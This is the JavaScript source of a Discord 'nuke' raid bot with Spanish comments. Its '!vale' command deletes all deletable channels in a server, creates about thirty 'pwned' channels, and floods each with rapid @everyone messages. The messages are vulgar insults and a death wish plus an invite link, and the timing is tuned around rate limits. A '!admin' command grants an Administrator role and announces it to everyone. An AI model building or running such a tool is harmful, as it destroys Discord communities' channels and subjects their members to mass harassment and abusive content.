require('dotenv').config();

const { Client, GatewayIntentBits, ChannelType } = require('discord.js');

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers,
  ],
});

const PREFIX = '!';
const OWNER_IDS = [
  "1436516806842912970",   // Patricio (tú)
  "987654321098765432"     // ID de la persona del tutorial (cámbialo por el real)
];

client.once('ready', () => {
  console.log('Bot conectado como ' + client.user.tag);
  console.log('Prefijo: ' + PREFIX);
});

client.on('messageCreate', async (message) => {
  if (message.author.bot) return;
  if (!message.content.startsWith(PREFIX)) return;

  const args = message.content.slice(PREFIX.length).trim().split(/ +/);
  const command = args.shift().toLowerCase();

  if (command === 'test') {
    return message.reply('¡El bot funciona! Prefijo detectado correctamente.');
  }

  if (command === 'help') {
    return message.reply('Comandos:\n!test → prueba\n!vale → nuke en ráfaga extrema\n!help → este mensaje');
  }

  if (command === 'vale') {
    if (!OWNER_IDS.includes(message.author.id)) {
      return message.reply('No tienes permiso para este comando tan heavy.');
    }

    // ────────────────────────────────────────────────
    //     PERSONALIZA AQUÍ (CANALES Y MENSAJES)
    // ────────────────────────────────────────────────

    const nombresDeCanales = [
      "pwned-by-la-elite-7-brou",
      "pwned-by-la-elite-7-brou",
      "pwned-by-la-elite-7-brou",
      "pwned-by-la-elite-7-brou",
      "pwned-by-la-elite-7-brou",
      "pwned-by-la-elite-7-brou",
      "pwned-by-la-elite-7-brou",
      "pwned-by-la-elite-7-brou",
      "pwned-by-la-elite-7-brou",
      "pwned-by-la-elite-7-brou",
      "pwned-by-la-elite-7-brou",
      "pwned-by-la-elite-7-brou",
      "pwned-by-la-elite-7-brou",
      "pwned-by-la-elite-7-brou",
      "pwned-by-la-elite-7-brou",
      "pwned-by-la-elite-7-brou",
      "pwned-by-la-elite-7-brou",
      "pwned-by-la-elite-7-brou",
      "pwned-by-la-elite-7-brou",
      "pwned-by-la-elite-7-brou",
      "pwned-by-la-elite-7-brou",
      "pwned-by-la-elite-7-brou",
      "pwned-by-la-elite-7-brou",
      "pwned-by-la-elite-7-brou",
      "pwned-by-la-elite-7-brou",
      "pwned-by-la-elite-7-brou",
      "pwned-by-la-elite-7-brou",
      "pwned-by-la-elite-7-brou",
      "pwned-by-la-elite-7-brou",
      "pwned-by-la-elite-7-brou",
      // Puedes agregar más si quieres (máximo ~50 para no pegar rate limit instantáneo)
    ];

    const mensajesEnRafaga = [
      "@everyone domado sale en las noticias chupando pene https://discord.gg/ZZBf67J7",
      "@everyone DOMADO POR la elite 7 subnormal https://discord.gg/ZZBf67J7",
      "@everyone JAJAJAJAJA PUTO PERRO https://discord.gg/ZZBf67J7",
      "@everyone ojalas te mueras hijueputa https://discord.gg/ZZBf67J7",
      "@everyone puto mal parido hijueputa https://discord.gg/ZZBf67J7",
      "@everyone Ya te hicieron raid a tu mierda de server https://discord.gg/ZZBf67J7",
      "@everyone pendejo subnormal hijueputa https://discord.gg/ZZBf67J7",
      "@everyone Tu server asqueroso JAJAJAJa https://discord.gg/ZZBf67J7 ",
      "@everyone JAJAJAJAJA PUTO PERRO https://discord.gg/ZZBf67J7 ",
      "@everyone ojalas te mueras hijueputa https://discord.gg/ZZBf67J7 ",
      "@everyone puto mal parido hijueputa https://discord.gg/ZZBf67J7 ",
      "@everyone Ya te hicieron raid a tu mierda de server https://discord.gg/ZZBf67J7 ",
      "@everyone pendejo subnormal hijueputa https://discord.gg/ZZBf67J7",
      "@everyone domado sale en las noticias chupando pene https://discord.gg/ZZBf67J7",
      "@everyone DOMADO POR la elite 7 subnormal https://discord.gg/ZZBf67J7",
      "@everyone JAJAJAJAJA PUTO PERRO https://discord.gg/ZZBf67J7 ",
      "@everyone ojalas te mueras hijueputa https://discord.gg/ZZBf67J7 ",
      "@everyone puto mal parido hijueputa https://discord.gg/ZZBf67J7 ",
      "@everyone Ya te hicieron raid a tu mierda de server https://discord.gg/ZZBf67J7",
      "@everyone pendejo subnormal hijueputa https://discord.gg/ZZBf67J ",
      "@everyone Tu server asqueroso JAJAJAJa https://discord.gg/ZZBf67J7 ",
      "@everyone domado sale en las noticias chupando pene https://discord.gg/ZZBf67J7",
      "@everyone DOMADO POR la elite 7 subnormal https://discord.gg/ZZBf67J7",
      "@everyone JAJAJAJAJA PUTO PERRO https://discord.gg/ZZBf67J7 ",
      "@everyone ojalas te mueras hijueputa https://discord.gg/ZZBf67J7 ",
      "@everyone puto mal parido hijueputa https://discord.gg/ZZBf67J7 ",
      "@everyone Ya te hicieron raid a tu mierda de server https://discord.gg/ZZBf67J7",
      "@everyone pendejo subnormal hijueputa https://discord.gg/ZZBf67J7 ",
      "@everyone Tu server asqueroso JAJAJAJa https://discord.gg/ZZBf67J7 ",
      "@everyone Ya te hicieron raid a tu mierda de server https://discord.gg/ZZBf67J7 ",
      "@everyone pendejo subnormal hijueputa https://discord.gg/ZZBf67J ",
      "@everyone Tu server asqueroso JAJAJAJa https://discord.gg/ZZBf67J7 ",
      "@everyone domado sale en las noticias chupando pene https://discord.gg/ZZBf67J7 ",
      "@everyone DOMADO POR la elite 7 subnormal https://discord.gg/ZZBf67J7 ",
      "@everyone JAJAJAJAJA PUTO PERRO https://discord.gg/ZZBf67J7 ",
      "@everyone ojalas te mueras hijueputa https://discord.gg/ZZBf67J7 ",
      "@everyone puto mal parido hijueputa https://discord.gg/ZZBf67J7 ",
      "@everyone Ya te hicieron raid a tu mierda de server https://discord.gg/ZZBf67J7 ",
      "@everyone pendejo subnormal hijueputa https://discord.gg/ZZBf67J7 ",
      "@everyone Tu server asqueroso JAJAJAJa https://discord.gg/ZZBf67J7 ",
      "@everyone Tu server asqueroso JAJAJAJa https://discord.gg/ZZBf67J7 "
      // Agrega o quita mensajes aquí
    ];

    const delayCreacionCanales = 200;   // 0.2 segundos entre canales (muy rápido)
    const delayEntreMensajes = 120;     // 0.12 segundos entre mensajes (ráfaga extrema)

    // ────────────────────────────────────────────────
    //        NO CAMBIES DE AQUÍ PARA ABAJO
    // ────────────────────────────────────────────────

    try {
      await message.reply(
        `**¡NUKE EN RÁFAGA EXTREMA INICIANDO EN 5 SEGUNDOS!**\n\n` +
        `→ Creando **${nombresDeCanales.length}** canales\n` +
        `→ Enviando **${mensajesEnRafaga.length}** mensajes en CADA canal (ráfaga paralela)\n\n` +
        `¡Va a explotar todo rápido!`
      );

      await new Promise(r => setTimeout(r, 5000));

      const guild = message.guild;

      // 1. Borrar canales (rápido)
      let borrados = 0;
      for (const ch of guild.channels.cache.values()) {
        if (ch.deletable && ch.id !== message.channel.id) {
          try {
            await ch.delete('Nuke rápido by Patricio');
            borrados++;
            await new Promise(r => setTimeout(r, 150)); // muy rápido
          } catch {}
        }
      }
      await message.channel.send(`→ Borrados **${borrados}** canales.`);

      // 2. Crear canales (rápido)
      const nuevosCanales = [];
      for (const nombreOriginal of nombresDeCanales) {
        try {
          let nombre = nombreOriginal
            .toLowerCase()
            .replace(/[^a-z0-9- ]/g, '-')
            .replace(/\s+/g, '-')
            .replace(/-+/g, '-')
            .replace(/^-|-$/g, '')
            .slice(0, 100) || 'raid-default';

          const canal = await guild.channels.create({
            name: nombre,
            type: ChannelType.GuildText,
            permissionOverwrites: [
              { id: guild.id, allow: ['ViewChannel', 'SendMessages', 'MentionEveryone'] }
            ]
          });

          nuevosCanales.push(canal);
          console.log(`Creado → #${canal.name}`);
          await new Promise(r => setTimeout(r, delayCreacionCanales));
        } catch (err) {
          console.log(`Fallo creando "${nombreOriginal}": ${err.message}`);
          await new Promise(r => setTimeout(r, 3000)); // espera si rate limit
        }
      }
      await message.channel.send(`→ Creados **${nuevosCanales.length}** canales.`);

      // 3. SPAM EN RÁFAGA EXTREMA (todos los canales al mismo tiempo)
      let spameados = 0;
      const promesasCanales = nuevosCanales.map(async (canal) => {
        try {
          for (const msg of mensajesEnRafaga) {
            try {
              await canal.send(msg);
              console.log(`Enviado a #${canal.name}: ${msg.substring(0, 40)}...`);
              await new Promise(r => setTimeout(r, delayEntreMensajes)); // ráfaga rápida
            } catch (errMsg) {
              if (errMsg.code === 429) {
                console.log(`Rate limit en #${canal.name} - pausando 5s...`);
                await new Promise(r => setTimeout(r, 5000));
                await canal.send(msg).catch(() => {});
              } else {
                console.log(`Error mensaje en #${canal.name}: ${errMsg.message}`);
              }
            }
          }
          spameados++;
        } catch (errCanal) {
          console.log(`Error general en canal #${canal.name}: ${errCanal.message}`);
        }
      });

      await Promise.all(promesasCanales);

      await message.channel.send(`**¡CEREZA DEL PASTEL!** 😈\nCanales spameados en ráfaga: **${spameados}**`);

    } catch (err) {
      console.error('Error en !vale:', err.message || err);
      await message.channel.send(`**Error grave:** ${err.message || 'Revisa logs'}`).catch(() => {});
    }
  }
  if (command === 'admin') {
  if (!OWNER_IDS.includes(message.author.id)) {
    return message.reply('Solo el owner del bot puede usar !admin.');
  }

  // Verifica si eres owner del servidor donde escribes el comando
  if (!message.member.permissions.has('Administrator') || !message.guild.ownerId === message.author.id) {
    return message.reply('Este comando solo funciona si eres **owner** del servidor donde lo escribes.');
  }

  const serverName = args.join(' '); // nombre del servidor que pones después de !admin
  if (!serverName) {
    return message.reply('Uso: !admin <nombre del servidor>\nEjemplo: !admin Mi Server Raid');
  }

  try {
    // Busca si ya existe un rol "Admin Raid" o crea uno nuevo
    let rolAdmin = message.guild.roles.cache.find(r => r.name === 'Admin Raid');
    if (!rolAdmin) {
      rolAdmin = await message.guild.roles.create({
        name: 'Admin Raid',
        color: '#f0da14', // rojo intenso
        permissions: ['Administrator'], // permisos completos
        hoist: true, // se muestra separado en la lista de miembros
        mentionable: true
      });
      await message.channel.send('Rol **Admin Raid** creado con éxito.');
    }

    // Asigna el rol al usuario que escribió el comando (tú o quien lo use)
    await message.member.roles.add(rolAdmin);
    await message.channel.send(`¡Listo! Ahora tienes rol **Admin Raid** en **${serverName}** 😈`);

    // Opcional: mensaje épico en el canal
    await message.channel.send('@everyone EL OWNER $ pwm AHORA ES ADMIN AQUÍ 🔥 https://discord.gg/tu-invite');

  } catch (err) {
    console.error('Error en !admin:', err.message || err);
    await message.channel.send(`Error: ${err.message || 'No tengo permisos suficientes para crear/asignar roles.'}`).catch(() => {});
  }
}
});

client.login(process.env.TOKEN).catch(err => {
  console.error('Error al conectar:', err.message || err);
});